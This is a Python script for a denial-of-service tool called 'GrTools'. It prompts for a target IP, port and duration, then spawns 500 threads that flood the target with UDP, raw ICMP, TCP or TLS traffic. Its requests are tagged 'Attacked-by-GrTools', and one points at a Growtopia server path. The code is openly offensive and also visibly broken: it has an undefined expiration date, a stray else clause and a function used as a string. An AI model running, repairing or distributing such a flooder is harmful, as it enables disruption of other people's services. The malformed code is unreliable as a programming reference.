import socket
import random
import ctypes
import sys
import datetime
import ssl
import http.client
import threading
import os
import time

tampilan = """
╔═══╦═══╗    ╔════╦═══╦═══╦╗──╔═══╗
║╔═╗║╔═╗║    ║╔╗╔╗║╔═╗║╔═╗║║──║╔═╗║
║║─╚╣╚═╝║    ╚╝║║╚╣║─║║║─║║║──║╚══╗
║║╔═╣╔╗╔╝      ║║─║║─║║║─║║║─╔╬══╗║
║╚╩═║║║╚╗      ║║─║╚═╝║╚═╝║╚═╝║╚═╝║
╚═══╩╝╚═╝      ╚╝─╚═══╩═══╩═══╩═══╝
"""
print(tampilan)

ip = str(input("GRC2@root~# Enter Target IP : "))
ip = socket.gethostbyname(ip)
port = int(input("GRC2@root~# Enter Target PORT : "))
times = int(input("GRC2@root~# Enter TIME : "))

print("""
    ┌────────────────────────────────────┐
    │          GrTools Methods           │            
    │  [+] TCP                           │           
    │  [+] UDP                           │          
    │  [+] TLS                           │                                                                                   
    │  [+] TCP-X (SOON)                  │            
    └────────────────────────────────────┘
   ┌───────────────────────────────────────┐
       Copyright  GrTools Plan Lifetime       
   └───────────────────────────────────────┘
""")

method = str(input("GRC2@root~# Enter METHOD : "))
if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "TLS":
    print("VALID METHOD")
else:
    print("METHOD INVALID!")
    time.sleep(200000)
    time.sleep(2000)

referers = ["""Server Got Attacked!"""]

# Nih headers buat method biar tambah seterong aja :p
def Headers(method):
    header = ""
    if method == "TCP" or method == "UDP" or method == "TLS" or method == "CPUKILL":
        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referers = "Referers: " + random.choice(referers) + ip + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        header = post_host + referers + forward + content + connection +  length + "\r\n\r\n"
    return header

def udpby():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))

    udpfloodl = os.urandom(10024)
    while datetime.datetime.now() < expiration_date:
        get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers + "\r\n"
        try:
            s.sendto(udpfloodl, (ip, port))
            for x in range(times):
                s.sendto(udpfloodl, (ip, port))
                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            s.close()

def cpukil():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.connect((ip, port))
    cpu = os.urandom(10024)
    while datetime.datetime.now() < expiration_date:
        try:
            s.sendto(cpu, (ip, port))
            for x in range(times):
                    s.sendto(cpu, (ip, port))
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method {method} ")
        except socket.error:
            print(error)
            s.close()

def tcpfl():
    grtools = os.urandom(15419) + random._urandom(10414)
        get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + Headers + "\r\n"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(grtools)
            for x in range(times):
                    sock.send(grtools)
            print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")
        except socket.error:
                print(error)
                sock.close()

def httpfl():
        while datetime.datetime.now() < expiration_date:
            try:
                # Membuat koneksi SSL/TLS
                context = ssl.create_default_context()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = context.wrap_socket(sock)
                ssl_sock.connect((ip, 443))

                # Mengirimkan permintaan HTTP
                get_host = "GET /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
                http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"

                for x in range(times):
                    ssl_sock.send(http_request)

                print(f"Sending Packet to > ip : {ip} port : 443 | with time => {times} with Method HTTP Flood ")
            except socket.error:
                print(f"Error Cant Connecting | ip : {ip} port : 443")
            finally:
                ssl_sock.close()

for x in range(500):
    if method == "TCP":
            t = threading.Thread(target=tcpfl)
            t.start()
    elif method == "CPUKILL":
            t = threading.Thread(target=cpukil)
            t.start()
    elif method == "UDP":
            t = threading.Thread(target=udpby)
            t.start()
    elif method == "TLS":
            t = threading.Thread(target=httpfl)
            t.start()
